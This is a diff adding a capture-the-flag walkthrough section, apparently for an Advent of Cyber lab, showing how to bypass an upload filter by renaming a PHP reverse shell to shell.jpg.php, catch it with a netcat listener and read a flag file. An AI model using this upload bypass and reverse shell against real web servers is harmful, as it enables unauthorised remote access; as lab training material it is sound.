@@ -34,9 +34,52 @@ Answer
 
 ## Day 2: The Elf Strikes Back!
 
+go to the webpage
 
+![image](https://user-images.githubusercontent.com/90561566/215031356-e657878f-4a91-4294-8055-ad0e7e9b816f.png)
 
+provide our id numder `?id=ODIzODI5MTNiYmYw`
 
+![image](https://user-images.githubusercontent.com/90561566/215031951-b6ec3e33-3bfa-4aed-8a19-cbcf65666fef.png)
+
+check source code
+
+![image](https://user-images.githubusercontent.com/90561566/215032120-2d596691-109e-4fa5-87cd-55d2f2861bf9.png)
+
+prepare our shell
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+vi shell.php
+```
+
+change extension to bypass filter
+
+```
+mv shell.php shell.jpg.php
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215034419-4b5bb5a3-883b-4cce-bda5-d79194b52c65.png)
+
+go to /uploads, we can see a list of uploaded files here
+
+![image](https://user-images.githubusercontent.com/90561566/215034581-8bcb5625-d934-4df0-88f7-901e8ce8afc8.png)
+
+```
+nc -vlnp 4444
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215034758-8c9d5b51-49d6-43ef-86df-10752d0ee7ba.png)
+
+```
+cat /var/www/flag.txt
+```
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/215035035-957dfc91-edc1-471d-9d8a-37b7711f9382.png)
+
+## Day 3: Christmas Chaos
 
 
 
